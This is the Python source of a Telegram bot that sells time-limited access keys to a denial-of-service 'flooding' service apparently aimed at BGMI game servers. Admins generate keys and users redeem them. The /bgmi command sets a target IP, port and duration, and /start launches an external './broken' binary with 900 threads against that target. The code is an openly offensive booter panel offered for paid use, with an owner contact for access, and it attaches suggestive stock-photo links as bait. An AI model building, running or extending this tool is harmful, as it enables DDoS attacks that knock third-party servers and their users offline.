import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
from telegram import ReplyKeyboardMarkup, KeyboardButton

USER_FILE = "users.json"
KEY_FILE = "keys.json"
flooding_process = None
flooding_command = None
DEFAULT_THREADS = 900
users = {}
keys = {}

# Predefined list of image URLs (replace with your URLs)
IMAGE_URLS = [
    "https://www.pexels.com/photo/man-and-woman-kissing-near-pendant-lamp-1321287/",  # Replace with real image URLs
    "https://depositphotos.com/photo/cropped-view-passionate-girl-lingerie-undressing-businessman-bed-320401438.html",
    "https://depositphotos.com/photo/cropped-view-passionate-girl-lingerie-undressing-businessman-bed-320401438.html",
    "https://depositphotos.com/photo/close-up-top-above-high-angle-view-portrait-of-his-he-her-she-nice-lovely-334208536.html",
    "https://depositphotos.com/photo/close-up-top-above-high-angle-view-portrait-of-his-he-her-she-nice-lovely-334208536.html",
]

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()

                # Create inline button with the generated key
                keyboard = [
                    [InlineKeyboardButton(f"Copy Key: {key}", callback_data=key)]  # Button with key text
                ]
                markup = InlineKeyboardMarkup(keyboard)

                response = f"?? **KEY GENERATED**\n\n**YOUR KEY**: `{key}`\n\n**VALIDITY**: `{expiration_date}`\n\nRedeem your key using: `/redeem`"
                await update.message.reply_text(response, reply_markup=markup)
            except ValueError:
                response = f"USAGE /genkey 1 HOURS and DAYS"
        else:
            response = "USAGE /genkey 1 HOURS and DAYS"
    else:
        response = "❌ ACCESS DENIED. CONTACT OWNER - @GODxAloneBOY"

    await update.message.reply_text(response)

# Callback query handler for the inline button press
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    key = query.data  # The key is sent as callback_data
    # Send the key as a message to the user
    await query.answer()  # Acknowledge the callback
    await query.message.reply_text(f"?? **YOUR KEY**: `{key}`")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅ **KEY REDEEMED SUCCESSFULLY**"
        else:
            response = f"✨ **INVALID KEY!** Contact the BOT OWNER: @GODxAloneBOY"
    else:
        response = f"❌ **USAGE**: `/redeem <key>`"

    await update.message.reply_text(response)

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ YOU ARE NOT AUTHORIZED. DM OWNER @GODxAloneBOY")
        return

    if len(context.args) != 3:
        await update.message.reply_text('⚠️ **EXAMPLE USE**: `/bgmi <IP> <PORT> <DURATION>`')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./broken', target_ip, port, duration, str(DEFAULT_THREADS)]
    
    # Select a random image URL
    random_image = random.choice(IMAGE_URLS)

    # Send image and attack setup message together
    await update.message.reply_photo(
        photo=random_image, 
        caption=(
            f"✅ **TARGET SET**\n\n"
            f"**TARGET IP**: `{target_ip}`\n"
            f"**PORT**: `{port}`\n"
            f"**DURATION**: `{duration}`\n\n"
            "🛑 Press **/start** to begin the attack."
        )
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ **ACCESS DENIED**: You need to contact the owner @GODxAloneBOY for permission.")
        return

    if flooding_process is not None:
        await update.message.reply_text('⚠️ **ATTACK PENDING**\nUse **/stop** to stop the current attack.')
        return

    if flooding_command is None:
        await update.message.reply_text('⚠️ **TARGET NOT SET**: Use **/bgmi** to set a target first.')
        return

    # Get user details
    username = update.message.from_user.username

    flooding_process = subprocess.Popen(flooding_command)
    
    # Send attack start message with all details including IP, Port, Duration, and Username
    await update.message.reply_text(
        f"✅ **ATTACK STARTED!**\n\n"
        f"**TARGET IP**: `{flooding_command[1]}`\n"
        f"**PORT**: `{flooding_command[2]}`\n"
        f"**DURATION**: `{flooding_command[3]}`\n"
        f"**USERNAME**: @{username}\n"
        f"\nSend feedback to the owner @GODxAloneBOY."
    )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ **ACCESS DENIED**: You need to contact the owner @GODxAloneBOY for permission.")
        return

    if flooding_process is None:
        await update.message.reply_text('❌ **ERROR**: Attack is not running.')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('🛑 **ATTACK STOPPED**\nUse **/start** to restart the attack.')

# Update the alone_command function to include buttons with emojis
async def alone_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Create buttons with emojis
    markup = ReplyKeyboardMarkup(
        [
            [KeyboardButton("/bgmi 🎯"), KeyboardButton("/start 🚀")],
            [KeyboardButton("/stop ❌")]
        ],
        resize_keyboard=True  # Set this to True to automatically resize buttons
    )
    
    response = (
        "✌️ **ALL COMMANDS** ✌️\n\n"
        "🔑 **/genkey** -> FOR GENERATING A KEY\n"
        "♦️ **/redeem** -> FOR REDEEMING A KEY\n"
        "🎯 **/bgmi** -> TO SET ATTACK TARGET\n"
        "✅ **/start** -> TO START THE ATTACK\n"
        "🛑 **/stop** -> TO STOP THE ATTACK\n\n"
        f"🎁 OWNER: {OWNER_USERNAME}\n\n"
        "👍 Send your feedback or requests to the owner!"
    )  # Send message with the keyboard buttons
    await update.message.reply_text(response, reply_markup=markup)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("alone", alone_command))

    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()
